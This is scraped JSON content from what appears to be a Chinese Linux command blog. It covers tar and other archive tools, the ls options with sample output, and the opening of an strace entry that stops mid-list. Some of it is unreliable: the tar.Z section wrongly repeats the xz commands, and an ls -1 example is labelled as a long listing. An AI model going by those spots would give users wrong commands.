从archive.tar提取所有文件。 zip 格式 压缩： zip -r [目标文件名].zip [原文件/目录名] 解压： unzip [原文件名].zip 注：-r参数代表递归 tar 格式（该格式仅仅打包，不压缩） 打包：tar -cvf [目标文件名].tar [原文件名/目录名] 解包：tar -xvf [原文件名].tar 注：c参数代表create（创建），x参数代表extract（解包），v参数代表verbose（详细信息），f参数代表filename（文件名），所以f后必须接文件名。 tar.gz 格式 方式一：利用前面已经打包好的 tar 文件，直接用压缩命令。 压缩：gzip [原文件名].tar 解压：gunzip [原文件名].tar.gz 方式二：一次性打包并压缩、解压并解包 打包并压缩： tar -zcvf [目标文件名].tar.gz [原文件名/目录名] 解压并解包： tar -zxvf [原文件名].tar.gz 注：z代表用gzip算法来压缩/解压。 tar.bz2 格式 方式一：利用已经打包好的 tar 文件，直接执行压缩命令： 压缩：bzip2 [原文件名].tar 解压：bunzip2 [原文件名].tar.bz2 方式二：一次性打包并压缩、解压并解包 打包并压缩： tar -jcvf [目标文件名].tar.bz2 [原文件名/目录名] 解压并解包： tar -jxvf [原文件名].tar.bz2 注：小写j代表用bzip2算法来压缩/解压。 tar.xz 格式 方式一：利用已经打包好的 tar 文件，直接用压缩命令： 压缩：xz [原文件名].tar 解压：unxz [原文件名].tar.xz 方式二：一次性打包并压缩、解压并解包 打包并压缩： tar -Jcvf [目标文件名].tar.xz [原文件名/目录名] 解压并解包： tar -Jxvf [原文件名].tar.xz 注：大写J代表用xz算法来压缩/解压。 tar.Z 格式（已过时） 方式一：利用已经打包好的tar文件，直接用压缩命令： 压缩：xz [原文件名].tar 解压：unxz [原文件名].tar.xz 方式二：一次性打包并压缩、解压并解包 打包并压缩： tar -Jcvf [目标文件名].tar.xz [原文件名/目录名] 解压并解包： tar -Jxvf [原文件名].tar.xz 注：大写J代表用xz算法来压缩/解压。 jar 格式 压缩：jar -cvf [目标文件名].jar [原文件名/目录名] 解压：jar -xvf [原文件名].jar 注：如果是打包的是 Java 类库，并且该类库中存在主类，那么需要写一个 META-INF/MANIFEST.MF 配置文件，内容如下： Manifest-Version: 1.0 Created-By: 1.6.0_27 (Sun Microsystems Inc.) Main-class: the_name_of_the_main_class_should_be_put_here 然后用如下命令打包： jar -cvfm [目标文件名].jar META-INF/MANIFEST.MF [原文件名/目录名] 这样以后就能用“java -jar [文件名].jar”命令直接运行主类中的public static void main方法了。 7z 格式 压缩：7z a [目标文件名].7z [原文件名/目录名] 解压：7z x [原文件名].7z 注：这个7z解压命令支持rar格式，即： 7z x [原文件名].rar 其它例子 将文件全部打包成 tar 包 ： tar -cvf log.tar log2012.log 仅打包，不压缩！ tar -zcvf log.tar.gz log2012.log 打包后，以 gzip 压缩 tar -jcvf log.tar.bz2 log2012.log 打包后，以 bzip2 压缩 在选项f之后的文件档名是自己取的，我们习惯上都用 .tar 来作为辨识。 如果加z选项，则以.tar.gz 或.tgz 来代表 gzip 压缩过的 tar 包；如果加j选项，则以.tar.bz2 来作为 tar 包名。 解压目录 去掉第一层目录结构，要出除第二层，--strip-components 2 tar -xvf portal-web-v2.0.0.tar --strip-components 1 -C 指定目录 查阅上述 tar 包内有哪些文件 ： tar -ztvf log.tar.gz 由于我们使用 gzip 压缩的 log.tar.gz，所以要查阅 log.tar.gz 包内的文件时，就得要加上z这个选项了。 将 tar 包解压缩 ： tar -zxvf /opt/soft/test/log.tar.gz 在预设的情况下，我们可以将压缩档在任何地方解开的 只将 tar 内的部分文件解压出来 ： tar -zxvf /opt/soft/test/log30.tar.gz log2013.log 我可以透过tar -ztvf来查阅 tar 包内的文件名称，如果单只要一个文件，就可以透过这个方式来解压部分文件！ 文件备份下来，并且保存其权限 ： tar -zcvpf log31.tar.gz log2014.log log2015.log log2016.log 这个-p的属性是很重要的，尤其是当您要保留原本文件的属性时。 在文件夹当中，比某个日期新的文件才备份 ： tar -N &quot;2012/11/13&quot; -zcvf log17.tar.gz test 备份文件夹内容是排除部分文件： tar --exclude scf/service -zcvf scf.tar.gz scf/* 打包文件之后删除源文件： tar -cvf test.tar test --remove-files 其实最简单的使用 tar 就只要记忆底下的方式即可： 压 缩：tar -jcv -f filename.tar.bz2 要被压缩的文件或目录名称查 询：tar -jtv -f filename.tar.bz2 解压缩：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"tar","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/tar/","stats":{"text":"28 min read","time":1648000,"words":6773,"minutes":28},"date":"2022-02-01 15:43:21","dateFormat":"2022-02-01"},{"content":"显示目录内容列表。 补充说明 ls 命令用来显示目标列表，在 Linux 中是使用率较高的命令。ls 命令的输出信息可以进行彩色加亮显示，以分区不同类型的文件。 语法 ls [选项] [文件名...] [-1abcdfgiklmnopqrstuxABCDFGLNQRSUX] [-w cols] [-T cols] [-I pattern] [--full-time] [--format={long,verbose,commas,across,vertical,single-col‐umn}] [--sort={none,time,size,extension}] [--time={atime,access,use,ctime,status}] [--color[={none,auto,always}]] [--help] [--version] [--] 选项 -C # 多列输出，纵向排序。-F # 每个目录名加 &quot;/&quot; 后缀，每个 FIFO 名加 &quot;|&quot; 后缀， 每个可运行名加“ * ”后缀。-R # 递归列出遇到的子目录。-a # 列出所有文件，包括以 &quot;.&quot; 开头的隐含文件。-c # 使用“状态改变时间”代替“文件修改时间”为依据来排序（使用“-t”选项时）或列出（使用“-l”选项时）。-d # 将目录名象其它文件一样列出，而不是列出它们的内容。-i # 输出文件前先输出文件系列号（即 i 节点号: i-node number）。 -l 列出（以单列格式）文件模式（file mode），文件的链 接数，所有者名，组名，文件大小（以字节为单位），时间信息，及文件名。缺省时，时间信息显示最近修改时间； 可以以选项“-c”和“-u”选择显示其它两种时间信息。对于设 备文件，原先显示文件大小的区域通常显示的是主要和次要的号（majorand minor device numbers）。-q # 将文件名中的非打印字符输出为问号。（对于到终端的输出这是缺省的。）-r # 逆序排列。-t # 按时间信息排序。-u # 使用最近访问时间代替最近修改时间为依据来排序（使用“-t”选项时）或列出（使用“-l”选项时）。-1 # 单列输出。-1, --format=single-column # 一行输出一个文件（单列输出）。如标准输出不是到终端，此选项就是缺省选项。-a, --all # 列出目录中所有文件，包括以“.”开头的文件。-b, --escape # 把文件名中不可输出的字符用反斜杠加字符编号 (就象在 C 语言里一样) 的形式列出。-c, --time=ctime, --time=status # 按文件状态改变时间（i 节点中的 ctime）排序并输出目录内 # 容。如采用长格式输出（选项“-l”），使用文件的状态改 # 变时间取代文件修改时间。【译注：所谓文件状态改变（i 节 # 点中以 ctime 标志），既包括文件被修改，又包括文件属性（ 如所有者、组、链接数等等）的变化】-d, --directory # 将目录名象其它文件一样列出，而不是列出它们的内容。-f # 不排序目录内容； 按它们在磁盘上存储的顺序列出。同时启 动“ -a ”选项，如果在“ -f ”之前存在“ -l # ”、“ - -color ”或“ -s ”，则禁止它们。-g # 忽略，为兼容 UNIX 用。-i, --inode # 在每个文件左边打印 i 节点号（也叫文件序列号和索引号: file serial number and index num‐ # ber）。i 节点号在每个特定的文件系统中是唯一的。-k, --kilobytes # 如列出文件大小，则以千字节 KB 为单位。-l, --format=long, --format=verbose # 除每个文件名外，增加显示文件类型、权限、硬链接数、所 有者名、组名、大小（ byte # ）、及时间信息（如未指明是 其它时间即指修改时间）。对于 6 个月以上的文件或超出未来 1 # 小时的文件，时间信息中的时分将被年代取代。 # 每个目录列出前，有一行“总块数”显示目录下全部文件所 占的磁盘空间。块默认是 1024 # 字节； 如果设置了 POSIXLY_CORRECT 的环境变量，除非用“ -k ”选项，则默认块大小是 512 字 # 节。每一个硬链接都计入总块数（因此可能重复计数），这无 疑是个缺点。# 列出的权限类似于以符号表示（文件）模式的规范。但是 ls # 在每套权限的第三个字符中结合了多位（ multiple bits ） 的信息，如下： s 如果设置了 setuid # 位或 setgid 位，而且也设置了相应的可执行位。 S 如果设置了 setuid 位或 setgid # 位，但是没有设置相应的可执行位。 t 如果设置了 sticky 位，而且也设置了相应的可执行位。 T # 如果设置了 sticky 位，但是没有设置相应的可执行位。 x # 如果仅仅设置了可执行位而非以上四种情况。 - 其它情况（即可执行位未设置）。-m, --format=commas # 水平列出文件，每行尽可能多，相互用逗号和一个空格分隔。-n, --numeric-uid-gid # 列出数字化的 UID 和 GID 而不是用户名和组名。-o # 以长格式列出目录内容，但是不显示组信息。等于使用“ --format=long --no-group # ”选项。提供此选项是为了与其它版本的 ls 兼容。-p # 在每个文件名后附上一个字符以说明该文件的类型。类似“ -F ”选项但是不 标示可执行文件。-q, --hide-control-chars # 用问号代替文件名中非打印的字符。这是缺省选项。-r, --reverse # 逆序排列目录内容。-s, --size # 在每个文件名左侧输出该文件的大小，以 1024 字节的块为单位。如果设置了 POSIXLY_CORRECT # 的环境变量，除非用“ -k ”选项，块大小是 512 字节。-t, --sort=time # 按文件最近修改时间（ i 节点中的 mtime ）而不是按文件名字典序排序，新文件 靠前。-u, --time=atime, --time=access, --time=use # 类似选项“ -t ”，但是用文件最近访问时间（ i 节点中的 atime ）取代文件修 # 改时间。如果使用长格式列出，打印的时间是最近访问时间。-w, --width cols # 假定屏幕宽度是 cols （ cols 以实际数字取代）列。如未用此选项，缺省值是这 # 样获得的：如可能先尝试取自终端驱动，否则尝试取自环境变量 COLUMNS （如果设 # 置了的话），都不行则取 80 。-x, --format=across, --format=horizontal # 多列输出，横向排序。-A, --almost-all # 显示除 &quot;.&quot; 和 &quot;..&quot; 外的所有文件。-B, --ignore-backups # 不输出以“ ~ ”结尾的备份文件，除非已经在命令行中给出。-C, --format=vertical # 多列输出，纵向排序。当标准输出是终端时这是缺省项。使用命令名 dir 和 d 时， 则总是缺省的。-D, --dired # 当采用长格式（“-l”选项）输出时，在主要输出后，额外打印一行： //DIRED// BEG1 END1 BEG2 # END2 ...# BEGn 和 ENDn 是无符号整数，记录每个文件名的起始、结束位置在输出中的位置（# 字节偏移量）。这使得 Emacs 易于找到文件名，即使文件名包含空格或换行等非正# 常字符也无需特异的搜索。# # 如果目录是递归列出的（“ -R ”选项），每个子目录后列出类似一行： # //SUBDIRED// BEG1 END1 ... 【译注：我测试了 TurboLinux4.0 和 RedHat6.1 ，发现它们都是在 “ # //DIRED// BEG1... ”之后列出“ //SUBDIRED// BEG1 ... ”，也即只有一个 # 而不是在每个子目录后都有。而且“ //SUBDIRED// BEG1 ... ”列出的是各个子目 录名的偏移。】-F, --classify, --file-type # 在每个文件名后附上一个字符以说明该文件的类型。“ * ”表示普通的可执行文件； “ / ”表示目录； “ # @ ”表示符号链接； “ | ”表示 FIFOs； “ = ”表示套接字 (sockets) ； 什么也没有则表示普通文件。-G, --no-group # 以长格式列目录时不显示组信息。-I, --ignorepattern # 除非在命令行中给定，不要列出匹配 shell 文件名匹配式（pattern ，不是指一般 # 表达式）的文件。在 shell 中，文件名以&quot;.&quot;起始的不与在文件名匹配式 (pattern) # 开头的通配符匹配。-L, --dereference # 列出符号链接指向的文件的信息，而不是符号链接本身。-N, --literal # 不要用引号引起文件名。-Q, --quote-name # 用双引号引起文件名，非打印字符以 C 语言的方法表示。-R, --recursive # 递归列出全部目录的内容。-S, --sort=size # 按文件大小而不是字典序排序目录内容，大文件靠前。-T, --tabsize cols # 假定每个制表符宽度是 cols 。缺省为 8。为求效率， ls 可能在输出中使用制表符。 若 cols 为 0，则不使用制表符。-U, --sort=none # 不排序目录内容； 按它们在磁盘上存储的顺序列出。（选项“-U”和“-f”的不 # 同是前者不启动或禁止相关的选项。）这在列很大的目录时特别有用，因为不加排序 # 能显著的加快速度。-X, --sort=extension # 按文件扩展名（由最后的 &quot;.&quot; 之后的字符组成）的字典序排序。没有扩展名的先列 出。--color[=when] # 指定是否使用颜色区别文件类别。环境变量 LS_COLORS 指定使用的颜色。如何设置 这个变量见 dir‐ # colors(1) 。 when 可以被省略，或是以下几项之一：none # 不使用颜色，这是缺省项。 # auto 仅当标准输出是终端时使用。 always 总是使用颜色。指定 --color 而且省略 when 时就等同于 # --color=always 。--full-time # 列出完整的时间，而不是使用标准的缩写。格式如同 date(1) 的缺省格式； -C # 多列输出，纵向排序。 -F # 每个目录名加 &quot;/&quot; 后缀，每个 FIFO 名加 &quot;|&quot; 后缀， 每个可运行名加“ * ”后缀。 -R # 递归列出遇到的子目录。 -a # 列出所有文件，包括以 &quot;.&quot; 开头的隐含文件。 -c # 使用“状态改变时间”代替“文件修改时间”为依据来排序（使用“-t”选项时）或列出（使用“-l”选项时）。 -d # 将目录名象其它文件一样列出，而不是列出它们的内容。 -i # 输出文件前先输出文件系列号（即 i 节点号: i-node number）。 -l 列出（以单列格式）文件模式（file mode），文件的链 接数，所有者名，组名，文件大小（以字节为单位），时间信息，及文件名。缺省时，时间信息显示最近修改时间；可以以选项“-c”和“-u”选择显示其它两种时间信息。对于设 备文件，原先显示文件大小的区域通常显示的是主要和次要的号（majorand minor device numbers）。 -q # 将文件名中的非打印字符输出为问号。（对于到终端的输出这是缺省的。） -r # 逆序排列。 -t # 按时间信息排序。 -u # 使用最近访问时间代替最近修改时间为依据来排序（使用“-t”选项时）或列出（使用“-l”选项时）。 -1 # 单列输出。 -1, --format=single-column # 一行输出一个文件（单列输出）。如标准输出不是到终端，此选项就是缺省选项。 -a, --all # 列出目录中所有文件，包括以“.”开头的文件。 -b, --escape # 把文件名中不可输出的字符用反斜杠加字符编号(就象在 C 语言里一样)的形式列出。 -c, --time=ctime, --time=status # 按文件状态改变时间（i节点中的ctime）排序并输出目录内 # 容。如采用长格式输出（选项“-l”），使用文件的状态改 # 变时间取代文件修改时间。【译注：所谓文件状态改变（i节 # 点中以ctime标志），既包括文件被修改，又包括文件属性（ 如所有者、组、链接数等等）的变化】 -d, --directory # 将目录名象其它文件一样列出，而不是列出它们的内容。 -f # 不排序目录内容；按它们在磁盘上存储的顺序列出。同时启 动“ -a ”选项，如果在“ -f ”之前存在“ -l # ”、“ - -color ”或“ -s ”，则禁止它们。 -g # 忽略，为兼容UNIX用。 -i, --inode # 在每个文件左边打印 i 节点号（也叫文件序列号和索引号: file serial number and index num‐ # ber）。i节点号在每个特定的文件系统中是唯一的。 -k, --kilobytes # 如列出文件大小，则以千字节KB为单位。 -l, --format=long, --format=verbose # 除每个文件名外，增加显示文件类型、权限、硬链接数、所 有者名、组名、大小（ byte # ）、及时间信息（如未指明是 其它时间即指修改时间）。对于6个月以上的文件或超出未来 1 # 小时的文件，时间信息中的时分将被年代取代。 # 每个目录列出前，有一行“总块数”显示目录下全部文件所 占的磁盘空间。块默认是 1024 # 字节；如果设置了 POSIXLY_CORRECT 的环境变量，除非用“ -k ”选项，则默认块大小是 512 字 # 节。每一个硬链接都计入总块数（因此可能重复计数），这无 疑是个缺点。 # 列出的权限类似于以符号表示（文件）模式的规范。但是 ls # 在每套权限的第三个字符中结合了多位（ multiple bits ） 的信息，如下： s 如果设置了 setuid # 位或 setgid 位，而且也设置了相应的可执行位。 S 如果设置了 setuid 位或 setgid # 位，但是没有设置相应的可执行位。 t 如果设置了 sticky 位，而且也设置了相应的可执行位。 T # 如果设置了 sticky 位，但是没有设置相应的可执行位。 x # 如果仅仅设置了可执行位而非以上四种情况。 - 其它情况（即可执行位未设置）。 -m, --format=commas # 水平列出文件，每行尽可能多，相互用逗号和一个空格分隔。 -n, --numeric-uid-gid # 列出数字化的 UID 和 GID 而不是用户名和组名。 -o # 以长格式列出目录内容，但是不显示组信息。等于使用“ --format=long --no-group # ”选项。提供此选项是为了与其它版本的 ls 兼容。 -p # 在每个文件名后附上一个字符以说明该文件的类型。类似“ -F ”选项但是不 标示可执行文件。 -q, --hide-control-chars # 用问号代替文件名中非打印的字符。这是缺省选项。 -r, --reverse # 逆序排列目录内容。 -s, --size # 在每个文件名左侧输出该文件的大小，以 1024 字节的块为单位。如果设置了 POSIXLY_CORRECT # 的环境变量，除非用“ -k ”选项，块大小是 512 字节。 -t, --sort=time # 按文件最近修改时间（ i 节点中的 mtime ）而不是按文件名字典序排序，新文件 靠前。 -u, --time=atime, --time=access, --time=use # 类似选项“ -t ”，但是用文件最近访问时间（ i 节点中的 atime ）取代文件修 # 改时间。如果使用长格式列出，打印的时间是最近访问时间。 -w, --width cols # 假定屏幕宽度是 cols （ cols 以实际数字取代）列。如未用此选项，缺省值是这 # 样获得的：如可能先尝试取自终端驱动，否则尝试取自环境变量 COLUMNS （如果设 # 置了的话），都不行则取 80 。 -x, --format=across, --format=horizontal # 多列输出，横向排序。 -A, --almost-all # 显示除 &quot;.&quot; 和 &quot;..&quot; 外的所有文件。 -B, --ignore-backups # 不输出以“ ~ ”结尾的备份文件，除非已经在命令行中给出。 -C, --format=vertical # 多列输出，纵向排序。当标准输出是终端时这是缺省项。使用命令名 dir 和 d 时， 则总是缺省的。 -D, --dired # 当采用长格式（“-l”选项）输出时，在主要输出后，额外打印一行： //DIRED// BEG1 END1 BEG2 # END2 ... # BEGn 和 ENDn 是无符号整数，记录每个文件名的起始、结束位置在输出中的位置（ # 字节偏移量）。这使得 Emacs 易于找到文件名，即使文件名包含空格或换行等非正 # 常字符也无需特异的搜索。 # # 如果目录是递归列出的（“ -R ”选项），每个子目录后列出类似一行： # //SUBDIRED// BEG1 END1 ... 【译注：我测试了 TurboLinux4.0 和 RedHat6.1 ，发现它们都是在 “ # //DIRED// BEG1... ”之后列出“ //SUBDIRED// BEG1 ... ”，也即只有一个 # 而不是在每个子目录后都有。而且“ //SUBDIRED// BEG1 ... ”列出的是各个子目 录名的偏移。】 -F, --classify, --file-type # 在每个文件名后附上一个字符以说明该文件的类型。“ * ”表示普通的可执行文件； “ / ”表示目录；“ # @ ”表示符号链接；“ | ”表示FIFOs；“ = ”表示套接字 (sockets) ；什么也没有则表示普通文件。 -G, --no-group # 以长格式列目录时不显示组信息。 -I, --ignorepattern # 除非在命令行中给定，不要列出匹配shell文件名匹配式（pattern ，不是指一般 # 表达式）的文件。在shell中，文件名以&quot;.&quot;起始的不与在文件名匹配式(pattern) # 开头的通配符匹配。 -L, --dereference # 列出符号链接指向的文件的信息，而不是符号链接本身。 -N, --literal # 不要用引号引起文件名。 -Q, --quote-name # 用双引号引起文件名，非打印字符以 C 语言的方法表示。 -R, --recursive # 递归列出全部目录的内容。 -S, --sort=size # 按文件大小而不是字典序排序目录内容，大文件靠前。 -T, --tabsize cols # 假定每个制表符宽度是 cols 。缺省为 8。为求效率， ls 可能在输出中使用制表符。 若 cols 为 0，则不使用制表符。 -U, --sort=none # 不排序目录内容；按它们在磁盘上存储的顺序列出。（选项“-U”和“-f”的不 # 同是前者不启动或禁止相关的选项。）这在列很大的目录时特别有用，因为不加排序 # 能显著的加快速度。 -X, --sort=extension # 按文件扩展名（由最后的 &quot;.&quot; 之后的字符组成）的字典序排序。没有扩展名的先列 出。 --color[=when] # 指定是否使用颜色区别文件类别。环境变量 LS_COLORS 指定使用的颜色。如何设置 这个变量见 dir‐ # colors(1) 。 when 可以被省略，或是以下几项之一： none # 不使用颜色，这是缺省项。 # auto 仅当标准输出是终端时使用。 always 总是使用颜色。指定 --color 而且省略 when 时就等同于 # --color=always 。 --full-time # 列出完整的时间，而不是使用标准的缩写。格式如同 date(1) 的缺省格式；此格式 # 是不能改变的，但是你可以用 cut(1) 取出其中的日期字串并将结果送至命令 “ date -d ”。 # 输出的时间包括秒是非常有用的。（ Unix 文件系统储存文件的时间信息精确到秒， # 因此这个选项已经给出了系统所知的全部信息。）例如，当你有一个 Makefile 文件 # 不能恰当的生成文件时，这个选项会提供帮助。 参数 目录：指定要显示列表的目录，也可以是具体的文件。 实例 $ ls # 仅列出当前目录可见文件 $ ls -l # 列出当前目录可见文件详细信息 $ ls -hl # 列出详细信息并以可读大小显示文件大小 $ ls -al # 列出所有文件（包括隐藏）的详细信息 显示当前目录下包括影藏文件在内的所有文件列表 [root@localhost ~]# ls -a . anaconda-ks.cfg .bash_logout .bashrc install.log .mysql_history satools .tcshrc .vimrc .. .bash_history .bash_profile .cshrc install.log.syslog .rnd .ssh .viminfo 输出长格式列表 [root@localhost ~]# ls -1 anaconda-ks.cfg install.log install.log.syslog satools 显示文件的 inode 信息 索引节点（index inode 简称为“inode”）是 Linux 中一个特殊的概念，具有相同的索引节点号的两个文本本质上是同一个文件（除文件名不同外）。 [root@localhost ~]# ls -i -l anaconda-ks.cfg install.log 2345481 -rw------- 1 root root 859 Jun 11 22:49 anaconda-ks.cfg 2345474 -rw-r--r-- 1 root root 13837 Jun 11 22:49 install.log 水平输出文件列表 [root@localhost /]# ls -m bin, boot, data, dev, etc, home, lib, lost+found, media, misc, mnt, opt, proc, root, sbin, selinux, srv, sys, tmp, usr, var 修改最后一次编辑的文件 最近修改的文件显示在最上面。 [root@localhost /]# ls -t tmp root etc dev lib boot sys proc data home bin sbin usr var lost+found media mnt opt selinux srv misc 显示递归文件 [root@localhost ~]# ls -R .: anaconda-ks.cfg install.log install.log.syslog satools ./satools: black.txt freemem.sh iptables.sh lnmp.sh mysql php502_check.sh ssh_safe.sh 打印文件的 UID 和 GID [root@localhost /]# ls -n total 254 drwxr-xr-x 2 0 0 4096 Jun 12 04:03 bin drwxr-xr-x 4 0 0 1024 Jun 15 14:45 boot drwxr-xr-x 6 0 0 4096 Jun 12 10:26 data drwxr-xr-x 10 0 0 3520 Sep 26 15:38 dev drwxr-xr-x 75 0 0 4096 Oct 16 04:02 etc drwxr-xr-x 4 0 0 4096 Jun 12 10:26 home drwxr-xr-x 14 0 0 12288 Jun 16 04:02 lib drwx------ 2 0 0 16384 Jun 11 22:46 lost+found drwxr-xr-x 2 0 0 4096 May 11 2011 media drwxr-xr-x 2 0 0 4096 Nov 8 2010 misc drwxr-xr-x 2 0 0 4096 May 11 2011 mnt drwxr-xr-x 2 0 0 4096 May 11 2011 opt dr-xr-xr-x 232 0 0 0 Jun 15 11:04 proc drwxr-x--- 4 0 0 4096 Oct 15 14:43 root drwxr-xr-x 2 0 0 12288 Jun 12 04:03 sbin drwxr-xr-x 2 0 0 4096 May 11 2011 selinux drwxr-xr-x 2 0 0 4096 May 11 2011 srv drwxr-xr-x 11 0 0 0 Jun 15 11:04 sys drwxrwxrwt 3 0 0 98304 Oct 16 08:45 tmp drwxr-xr-x 13 0 0 4096 Jun 11 23:38 usr drwxr-xr-x 19 0 0 4096 Jun 11 23:38 var 列出文件和文件夹的详细信息 [root@localhost /]# ls -l total 254 drwxr-xr-x 2 root root 4096 Jun 12 04:03 bin drwxr-xr-x 4 root root 1024 Jun 15 14:45 boot drwxr-xr-x 6 root root 4096 Jun 12 10:26 data drwxr-xr-x 10 root root 3520 Sep 26 15:38 dev drwxr-xr-x 75 root root 4096 Oct 16 04:02 etc drwxr-xr-x 4 root root 4096 Jun 12 10:26 home drwxr-xr-x 14 root root 12288 Jun 16 04:02 lib drwx------ 2 root root 16384 Jun 11 22:46 lost+found drwxr-xr-x 2 root root 4096 May 11 2011 media drwxr-xr-x 2 root root 4096 Nov 8 2010 misc drwxr-xr-x 2 root root 4096 May 11 2011 mnt drwxr-xr-x 2 root root 4096 May 11 2011 opt dr-xr-xr-x 232 root root 0 Jun 15 11:04 proc drwxr-x--- 4 root root 4096 Oct 15 14:43 root drwxr-xr-x 2 root root 12288 Jun 12 04:03 sbin drwxr-xr-x 2 root root 4096 May 11 2011 selinux drwxr-xr-x 2 root root 4096 May 11 2011 srv drwxr-xr-x 11 root root 0 Jun 15 11:04 sys drwxrwxrwt 3 root root 98304 Oct 16 08:48 tmp drwxr-xr-x 13 root root 4096 Jun 11 23:38 usr drwxr-xr-x 19 root root 4096 Jun 11 23:38 var 列出可读文件和文件夹详细信息 [root@localhost /]# ls -lh total 254K drwxr-xr-x 2 root root 4.0K Jun 12 04:03 bin drwxr-xr-x 4 root root 1.0K Jun 15 14:45 boot drwxr-xr-x 6 root root 4.0K Jun 12 10:26 data drwxr-xr-x 10 root root 3.5K Sep 26 15:38 dev drwxr-xr-x 75 root root 4.0K Oct 16 04:02 etc drwxr-xr-x 4 root root 4.0K Jun 12 10:26 home drwxr-xr-x 14 root root 12K Jun 16 04:02 lib drwx------ 2 root root 16K Jun 11 22:46 lost+found drwxr-xr-x 2 root root 4.0K May 11 2011 media drwxr-xr-x 2 root root 4.0K Nov 8 2010 misc drwxr-xr-x 2 root root 4.0K May 11 2011 mnt drwxr-xr-x 2 root root 4.0K May 11 2011 opt dr-xr-xr-x 235 root root 0 Jun 15 11:04 proc drwxr-x--- 4 root root 4.0K Oct 15 14:43 root drwxr-xr-x 2 root root 12K Jun 12 04:03 sbin drwxr-xr-x 2 root root 4.0K May 11 2011 selinux drwxr-xr-x 2 root root 4.0K May 11 2011 srv drwxr-xr-x 11 root root 0 Jun 15 11:04 sys drwxrwxrwt 3 root root 96K Oct 16 08:49 tmp drwxr-xr-x 13 root root 4.0K Jun 11 23:38 usr drwxr-xr-x 19 root root 4.0K Jun 11 23:38 var 显示文件夹信息 [root@localhost /]# ls -ld /etc/ drwxr-xr-x 75 root root 4096 Oct 16 04:02 /etc/ 按时间列出文件和文件夹详细信息 [root@localhost /]# ls -lt total 254 drwxrwxrwt 3 root root 98304 Oct 16 08:53 tmp drwxr-xr-x 75 root root 4096 Oct 16 04:02 etc drwxr-x--- 4 root root 4096 Oct 15 14:43 root drwxr-xr-x 10 root root 3520 Sep 26 15:38 dev drwxr-xr-x 14 root root 12288 Jun 16 04:02 lib drwxr-xr-x 4 root root 1024 Jun 15 14:45 boot drwxr-xr-x 11 root root 0 Jun 15 11:04 sys dr-xr-xr-x 232 root root 0 Jun 15 11:04 proc drwxr-xr-x 6 root root 4096 Jun 12 10:26 data drwxr-xr-x 4 root root 4096 Jun 12 10:26 home drwxr-xr-x 2 root root 4096 Jun 12 04:03 bin drwxr-xr-x 2 root root 12288 Jun 12 04:03 sbin drwxr-xr-x 13 root root 4096 Jun 11 23:38 usr drwxr-xr-x 19 root root 4096 Jun 11 23:38 var drwx------ 2 root root 16384 Jun 11 22:46 lost+found drwxr-xr-x 2 root root 4096 May 11 2011 media drwxr-xr-x 2 root root 4096 May 11 2011 mnt drwxr-xr-x 2 root root 4096 May 11 2011 opt drwxr-xr-x 2 root root 4096 May 11 2011 selinux drwxr-xr-x 2 root root 4096 May 11 2011 srv drwxr-xr-x 2 root root 4096 Nov 8 2010 misc 按修改时间列出文件和文件夹详细信息 [root@localhost /]# ls -ltr total 254 drwxr-xr-x 2 root root 4096 Nov 8 2010 misc drwxr-xr-x 2 root root 4096 May 11 2011 srv drwxr-xr-x 2 root root 4096 May 11 2011 selinux drwxr-xr-x 2 root root 4096 May 11 2011 opt drwxr-xr-x 2 root root 4096 May 11 2011 mnt drwxr-xr-x 2 root root 4096 May 11 2011 media drwx------ 2 root root 16384 Jun 11 22:46 lost+found drwxr-xr-x 19 root root 4096 Jun 11 23:38 var drwxr-xr-x 13 root root 4096 Jun 11 23:38 usr drwxr-xr-x 2 root root 12288 Jun 12 04:03 sbin drwxr-xr-x 2 root root 4096 Jun 12 04:03 bin drwxr-xr-x 4 root root 4096 Jun 12 10:26 home drwxr-xr-x 6 root root 4096 Jun 12 10:26 data dr-xr-xr-x 232 root root 0 Jun 15 11:04 proc drwxr-xr-x 11 root root 0 Jun 15 11:04 sys drwxr-xr-x 4 root root 1024 Jun 15 14:45 boot drwxr-xr-x 14 root root 12288 Jun 16 04:02 lib drwxr-xr-x 10 root root 3520 Sep 26 15:38 dev drwxr-x--- 4 root root 4096 Oct 15 14:43 root drwxr-xr-x 75 root root 4096 Oct 16 04:02 etc drwxrwxrwt 3 root root 98304 Oct 16 08:54 tmp 按照特殊字符对文件进行分类 [root@localhost nginx-1.2.1]# ls -F auto/ CHANGES CHANGES.ru conf/ configure* contrib/ html/ LICENSE Makefile man/ objs/ README src/ 列出文件并标记颜色分类 [root@localhost nginx-1.2.1]# ls --color=auto auto CHANGES CHANGES.ru conf configure contrib html LICENSE Makefile man objs README src ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ls","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ls/","stats":{"text":"28 min read","time":1664000,"words":6515,"minutes":28},"date":"2022-02-01 15:40:38","dateFormat":"2022-02-01"},{"content":"跟踪系统调用和信号。 补充说明 strace 命令是一个集诊断、调试、统计与一体的工具，我们可以使用 strace 对应用的系统调用和信号传递的跟踪结果来对应用进行分析，以达到解决问题或者是了解应用工作过程的目的。当然 strace 与专业的调试工具比如说 gdb 之类的是没法相比的，因为它不是一个专业的调试器。 strace 的最简单的用法就是执行一个指定的命令，在指定的命令结束之后它也就退出了。在命令执行的过程中，strace 会记录和解析命令进程的所有系统调用以及这个进程所接收到的所有的信号值。 语法 strace [ -dffhiqrtttTvxx ] [ -acolumn ] [ -eexpr ] ... [ -ofile ] [-ppid ] ... [ -sstrsize ] [ -uusername ] [ -Evar=val ] ... [ -Evar ]... [command [ arg ... ] ] strace -c [ -eexpr ] ... [ -Ooverhead ] [ -Ssortby ] [ command [ arg... ] ] 选项 -c 统计每一系统调用的所执行的时间,次数和出错的次数等. -d 输出strace关于标准错误的调试信息. -f 跟踪由fork调用所产生的子进程. -ff 如果提供-o filename,则所有进程的跟踪结果输出到相应的filename.pid中,pid是各进程的进程号. -F 尝试跟踪vfork调用.在-f时,vfork不被跟踪. -h 输出简要的帮助信息. -i 输出系统调用的入口指针. -q 禁止输出关于脱离的消息. -r 打印出相对时间关于,,每一个系统调用. -t 在输出中的每一行前加上时间信息. -tt 在输出中的每一行前加上时间信息,微秒级. -ttt 微秒级输出,以秒了表示时间. -T 显示每一调用所耗的时间. -v 